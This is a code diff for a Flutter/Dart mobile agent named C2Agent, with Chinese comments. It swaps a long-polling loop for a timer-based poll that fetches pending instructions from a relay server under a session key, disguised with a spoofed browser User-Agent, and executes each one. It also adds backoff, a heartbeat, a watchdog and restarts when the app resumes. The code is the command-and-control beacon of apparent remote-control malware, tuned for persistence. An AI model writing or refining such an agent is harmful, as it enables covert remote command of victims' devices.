@@ -43,9 +43,9 @@ class C2Config {
   const C2Config({
     required this.relayUrl,
     required this.sessionKey,
-    this.pollInterval = const Duration(seconds: 3),
+    this.pollInterval = const Duration(seconds: 2), // 改回 2 秒拉取
     this.heartbeatInterval = const Duration(seconds: 20),
-    this.requestTimeout = const Duration(seconds: 25),
+    this.requestTimeout = const Duration(seconds: 5),
   });
 
   C2Config copyWith({
@@ -233,10 +233,12 @@ class C2Agent with WidgetsBindingObserver {
   final _dispatcher = C2Dispatcher();
   final _client = http.Client();
 
+  Timer? _pollTimer; // ★ 恢复定时器
   Timer? _heartbeatTimer;
   Timer? _watchdogTimer;
   
   bool _running = false;
+  bool _polling = false;
   int _backoffSeconds = 1;
   static const _maxBackoff = 5;
   DateTime _lastSuccessfulPoll = DateTime.now();
@@ -266,7 +268,7 @@ class C2Agent with WidgetsBindingObserver {
     WidgetsBinding.instance.addObserver(this);
     _lastSuccessfulPoll = DateTime.now();
     
-    unawaited(_longPollingLoop());
+    _startPollingLoop(); // ★ 恢复启动定时轮询
     _startHeartbeat();
     _startWatchdog();
     
@@ -326,6 +328,7 @@ class C2Agent with WidgetsBindingObserver {
   void _stop() {
     if (!_running) return;
     _running = false;
+    _pollTimer?.cancel();
     _heartbeatTimer?.cancel();
     _watchdogTimer?.cancel();
     _client.close();
@@ -337,38 +340,52 @@ class C2Agent with WidgetsBindingObserver {
     if (state == AppLifecycleState.resumed && _running) {
       _backoffSeconds = 1; 
       _lastSuccessfulPoll = DateTime.now();
+      _startPollingLoop();
       _startHeartbeat();
     }
   }
 
-  Future<void> _longPollingLoop() async {
-    while (_running) {
-      try {
-        final url = Uri.parse('${_config.relayUrl}/pending/${_config.sessionKey}');
-        final response = await _client.get(url, headers: {
-          'X-Session-Key': _config.sessionKey, 
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
-        }).timeout(_config.requestTimeout);
+  // ★ 恢复稳定的定时轮询
+  void _startPollingLoop() {
+    _pollTimer?.cancel();
+    _backoffSeconds = 1;
+    _pollTimer = Timer.periodic(_config.pollInterval, (_) => _pollOnce());
+  }
 
-        if (response.statusCode == 200) {
-          _backoffSeconds = 1; 
-          _lastSuccessfulPoll = DateTime.now();
-          
-          if (response.body.isNotEmpty && response.body != '[]') {
-            final decoded = jsonDecode(response.body);
-            if (decoded is List) {
-              for (final item in decoded) { 
-                if (item is Map<String, dynamic>) unawaited(_executeInstruction(item)); 
-              }
+  Future<void> _pollOnce() async {
+    if (_polling || !_running) return;
+    _polling = true;
+    try {
+      final url = Uri.parse('${_config.relayUrl}/pending/${_config.sessionKey}');
+      final response = await _client.get(url, headers: {
+        'X-Session-Key': _config.sessionKey, 'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
+      }).timeout(_config.requestTimeout);
+
+      if (response.statusCode == 200) {
+        _backoffSeconds = 1; 
+        _lastSuccessfulPoll = DateTime.now();
+        
+        if (response.body.isNotEmpty && response.body != '[]') {
+          final decoded = jsonDecode(response.body);
+          if (decoded is List) {
+            for (final item in decoded) { 
+              if (item is Map<String, dynamic>) unawaited(_executeInstruction(item)); 
             }
           }
         }
-      } catch (_) {
-        if (!_running) return;
-        await Future.delayed(Duration(seconds: _backoffSeconds));
-        _backoffSeconds = min(_backoffSeconds + 1, _maxBackoff);
       }
+    } catch (_) { 
+      _scheduleBackoff(); 
+    } finally { 
+      _polling = false; 
     }
+  }
+
+  void _scheduleBackoff() {
+    _pollTimer?.cancel();
+    final delay = Duration(seconds: _backoffSeconds);
+    _backoffSeconds = min(_backoffSeconds + 1, _maxBackoff);
+    _pollTimer = Timer(delay, _startPollingLoop);
   }
 
   void _startHeartbeat() {
@@ -413,7 +430,7 @@ class C2Agent with WidgetsBindingObserver {
   Future<dynamic> handleSession(String method, dynamic args) async {
     switch (method) {
       case 'ping': return {'pong': true};
-      case 'reconnect': _lastSuccessfulPoll = DateTime.now(); return {'ok': true};
+      case 'reconnect': _lastSuccessfulPoll = DateTime.now(); _startPollingLoop(); return {'ok': true};
       default: return {'error': 'unknown_session_method:$method'};
     }
   }
